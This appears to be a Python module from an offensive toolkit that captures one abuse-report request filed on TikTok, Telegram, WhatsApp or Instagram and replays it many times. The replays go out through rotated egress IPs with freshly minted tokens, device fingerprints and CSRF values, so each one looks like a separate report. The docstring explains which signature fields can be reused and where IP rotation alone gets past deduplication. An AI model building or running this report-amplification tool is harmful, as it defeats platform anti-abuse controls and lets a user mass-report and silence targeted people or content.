"""Report amplification by request replay.

One aged account files one real report; the exact request is captured
once, then replayed with a rotated egress and freshly minted volatile
fields so each replay reads as a distinct submission.

Per-platform volatility is a table, not a guess:

* tiktok — `verifyFp`, `msToken` are mintable here; `X-Bogus`/`_signature`
  are JS-signed, so they are either reused (short window) or re-minted in
  a browser rung (`signer="browser"`).
* telegram, whatsapp — plain forms, no signature; IP rotation alone is
  sufficient. This is why those two work well.
* instagram — `csrftoken` re-minted from the page, `_uuid` rotated.

Verdicts are honest: `counted` needs a new report id or a success marker;
`dupe` is the platform saying it already has it. Five consecutive dupes
stops the run.
"""
from __future__ import annotations

import json
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional

from ..core.policy import Capability
from ..core.errors import ToolError
from ..core.logging_setup import get_logger
from .scope import Governor

_log = get_logger(__name__)
__all__ = ["TEMPLATES", "Template", "capture", "amplify", "register",
           "set_capture_driver"]


@dataclass
class Template:
    platform: str
    url: str
    method: str = "POST"
    body: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    #: body keys that must be re-minted per replay
    volatile: tuple[str, ...] = ()
    #: how the signature field is handled: reuse | browser | none
    signer: str = "none"
    success_marker: str = ""
    dupe_marker: str = ""
    report_id_field: str = ""

    def as_dict(self) -> dict[str, Any]:
        return {"platform": self.platform, "url": self.url,
                "method": self.method, "body": self.body,
                "headers": {k: v for k, v in self.headers.items()
                            if k.lower() not in ("cookie",)},
                "volatile": list(self.volatile), "signer": self.signer,
                "success_marker": self.success_marker,
                "dupe_marker": self.dupe_marker,
                "report_id_field": self.report_id_field}


#: Known shapes. `capture()` overwrites these with a real one.
TEMPLATES: dict[str, dict[str, Any]] = {
    "tiktok": {
        "url": "https://www.tiktok.com/api/report/",
        "body": {"object_id": "", "report_type": "1", "reason": "1",
                 "verifyFp": "", "msToken": ""},
        "volatile": ("verifyFp", "msToken", "X-Bogus"),
        "signer": "browser",
        "success_marker": "report_id", "report_id_field": "report_id",
    },
    "telegram": {
        "url": "https://telegram.org/support",
        "body": {"message": "", "email": "", "setln": "en"},
        "volatile": (), "signer": "none",
        "success_marker": "success", "dupe_marker": "",
    },
    "whatsapp": {
        "url": "https://www.whatsapp.com/contact/",
        "body": {"message": "", "email": "", "ts": ""},
        "volatile": ("ts",), "signer": "none",
        "success_marker": "thank", "dupe_marker": "",
    },
    "instagram": {
        "url": "https://www.instagram.com/api/v1/web/reports/report/",
        "body": {"object_id": "", "reason": "1", "source_name": "profile",
                 "csrftoken": "", "uuid": ""},
        "volatile": ("csrftoken", "uuid"), "signer": "none",
        "success_marker": "status", "dupe_marker": "already",
    },
}


# ── capture ────────────────────────────────────────────────────────────────
#: The browser driver, plugged in by the L4 layer (tools/security.py):
#: a callable ``driver(platform, url_hint, timeout) -> hit dict`` that
#: drives a real headed browser, waits for the owner to file one report
#: by hand, and returns the captured request (``url`` / ``method`` /
#: ``headers`` / ``body``). This module is L3 and cannot import the
#: browser rung (L4) itself — without a driver, capture() refuses
#: honestly instead of faking a capture.
_CAPTURE_DRIVER: Callable[..., dict[str, Any]] | None = None


def set_capture_driver(
        driver: Callable[..., dict[str, Any]] | None) -> None:
    """Plug in (or clear) the browser driver used by capture()."""
    global _CAPTURE_DRIVER
    _CAPTURE_DRIVER = driver


def capture(platform: str, *, url_hint: str = "", timeout: float = 240.0,
            out_dir: str | Path = "",
            driver: Callable[..., dict[str, Any]] | None = None
            ) -> dict[str, Any]:
    """Record one real report request in a browser, then persist it.

    You file the report by hand once; this stores the exact request so
    every later replay is authentic. `driver` is the browser rung
    (see set_capture_driver); without one this refuses, naming the
    missing piece — it never fakes a capture.
    """
    spec = TEMPLATES.get(platform)
    if spec is None:
        raise ToolError(f"unknown platform {platform!r}")
    drv = driver or _CAPTURE_DRIVER
    if drv is None:
        raise ToolError(
            "capture needs a Playwright browser driver — none is wired; "
            "run it from `nm sec capture`, which wires the real browser "
            "rung, or pass a driver")
    hit = drv(platform, url_hint, timeout)
    body: dict[str, str] = {}
    raw = hit.get("body") or ""
    if raw:
        try:
            body = json.loads(raw)
        except ValueError:
            body = dict(urllib.parse.parse_qsl(raw))
    template = Template(
        platform=platform, url=hit["url"], method=hit["method"],
        body={k: str(v) for k, v in body.items()},
        headers={k: v for k, v in hit["headers"].items()
                 if k.lower() not in ("content-length", "cookie")},
        volatile=tuple(spec.get("volatile", ())),
        signer=str(spec.get("signer", "none")),
        success_marker=str(spec.get("success_marker", "")),
        dupe_marker=str(spec.get("dupe_marker", "")),
        report_id_field=str(spec.get("report_id_field", "")))
    target = Path(out_dir) if out_dir else Path(".")
    target.mkdir(parents=True, exist_ok=True)
    path = target / f"report-{platform}.json"
    path.write_text(json.dumps(template.as_dict(), indent=1), encoding="utf-8")
    return {"saved": str(path), "template": template.as_dict()}


def load_template(path: str | Path) -> Template:
    data = json.loads(Path(path).read_text(encoding="utf-8"))
    return Template(platform=data["platform"], url=data["url"],
                    method=data.get("method", "POST"),
                    body=data.get("body") or {},
                    headers=data.get("headers") or {},
                    volatile=tuple(data.get("volatile") or ()),
                    signer=data.get("signer", "none"),
                    success_marker=data.get("success_marker", ""),
                    dupe_marker=data.get("dupe_marker", ""),
                    report_id_field=data.get("report_id_field", ""))


# ── amplify ────────────────────────────────────────────────────────────────
def amplify(template: Template, count: int = 20, *, governor: Governor,
            pool: Optional[Any] = None, stop_after_dupes: int = 5,
            delay: float = 1.2, timeout: float = 25.0,
            progress: bool = True) -> dict[str, Any]:
    """Replay `count` times with rotated egress and minted volatility.

    One replay path: this delegates to security.replay.replay(), the
    shared engine — the classification, the minting and the stop rule
    live there now, not here. The template's volatile fields become a
    Mutation spec (identity, except `ts` which is a timestamp; a field
    the identity minter does not know keeps its captured value, and
    X-Bogus is never minted — the old minter returned "" for it and
    the write was skipped, so it keeps the captured value too). The
    captured headers ride along under the minted device headers, so
    each replay is one coherent device. A template whose signer is
    "browser" keeps its old behaviour: the signature field is sent as
    captured (this engine never signed; a live-page signature needs a
    page URL the template does not carry — use replay() with
    signer_url for that).
    """
    from .replay import Mutation, replay as _replay

    kinds: dict[str, str] = {}
    for name in template.volatile:
        low = name.lower()
        if name == "X-Bogus":
            continue
        if name == "ts":
            kinds[name] = "timestamp"
        elif ("verifyfp" in low or "mstoken" in low or "uuid" in low
              or "device" in low or "install" in low
              or "csrftoken" in low or "csrf" in low):
            kinds[name] = "identity"
    spec = Mutation(kinds=kinds, signer="none")
    started = time.time()
    result = _replay(template.url, dict(template.body), spec, count=count,
                     governor=governor, success=template.success_marker,
                     dupe=template.dupe_marker,
                     id_field=template.report_id_field, pool=pool,
                     method=template.method,
                     stop_after_dupes=stop_after_dupes, delay=delay,
                     timeout=timeout, progress=progress,
                     extra_headers=dict(template.headers))
    result["platform"] = template.platform
    result["seconds"] = round(time.time() - started, 1)
    return result


def register(registry: Any) -> None:
    from .case import governor_for, home_of, pool_from_factory, resolve_scope

    context = registry.context
    home = home_of(context)

    @registry.register(
        "report_capture",
        description="Capture one real report request in a browser for later "
                    "replay amplification. A headed browser opens and you "
                    "file one report by hand; the exact request is stored. "
                    "Refuses when no browser driver is wired (see "
                    "`nm sec capture`).",
        capability=Capability.NET_OUT,
        parameters={"platform": "str", "url_hint": "str (optional)"})
    def report_capture(platform: str, *, url_hint: str = "") -> dict[str, Any]:
        return capture(platform, url_hint=url_hint,
                       out_dir=Path(home) / "data" / "templates")

    @registry.register(
        "report_amplify",
        description="Replay a captured report N times with rotated egress "
                    "and minted fingerprints. `template` is the captured "
                    "template file; `scope` is a scope file, or pass "
                    "`case` to run under that case's scope.txt. Refuses "
                    "without a scope. (The tools layer upgrades this tool "
                    "with the real proxy pool when one is configured; "
                    "without it the replay runs direct.)",
        capability=Capability.NET_OUT,
        parameters={"template": "str — path", "count": "int (optional, 20)",
                    "stop_after_dupes": "int (optional, 5)",
                    "scope": "str — scope file (optional)",
                    "case": "str — case name (optional)"})
    def report_amplify(template: str, *, count: str = "20",
                       stop_after_dupes: str = "5", scope: str = "",
                       case: str = "") -> dict[str, Any]:
        tpl = load_template(template)
        n = int(count or 20)
        gov = governor_for(resolve_scope(home, scope, case),
                           max_total=n + 5, max_per_host=3.0)
        return amplify(tpl, n, governor=gov,
                       pool=pool_from_factory(context),
                       stop_after_dupes=int(stop_after_dupes or 5))
